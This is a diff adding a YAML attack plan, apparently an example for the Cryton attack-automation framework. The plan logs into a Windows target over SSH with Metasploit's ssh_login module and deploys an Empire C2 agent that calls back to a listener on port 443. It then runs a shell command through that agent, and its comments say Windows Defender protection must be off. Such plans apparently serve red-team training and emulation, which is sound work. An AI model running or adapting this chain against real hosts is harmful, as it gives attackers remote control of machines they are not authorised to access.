@@ -1,0 +1,51 @@
+---
+# This example shows how to deploy an Empire agent on a windows machine, and how to execute a Shell command or an Empire module
+# using the deployed agent.
+# Required modules: mod_msf.
+# IMPORTANT: For this example to work, windows defender and must be off, especially Real-time Virus and threat protection
+
+plan:
+  name: Empire agents on Windows example
+  owner: Cryton
+  stages:
+    - name: stage-one
+      trigger_type: delta
+      trigger_args:
+        seconds: 0
+      steps:
+        - name: create-ssh-session
+          is_init: true
+          step_type: worker/execute
+          arguments:
+            create_named_session: session_to_target_1
+            module: mod_msf
+            module_arguments:
+              module_type: auxiliary
+              module: scanner/ssh/ssh_login
+              module_options:
+                RHOSTS: {{ target.address }}
+                USERNAME: {{ target.username }}
+                PASSWORD: {{ target.password }}
+          next:
+            - type: result
+              value: OK
+              step: deploy-agent
+        - name: deploy-agent
+          step_type: empire/agent-deploy
+          arguments:
+            use_named_session: session_to_target_1
+            listener_name: testing
+            listener_port: 443
+            listener_options:
+              Host: {{ empire_server_address }}
+            stager_type: multi/launcher
+            agent_name: MyAgent # only lower/upper characters and numbers are allowed in name
+          next:
+            - type: result
+              value: OK
+              step: whoami-on-agent
+        - name: whoami-on-agent
+          step_type: empire/execute
+          arguments:
+            use_agent: MyAgent
+            shell_command: whoami
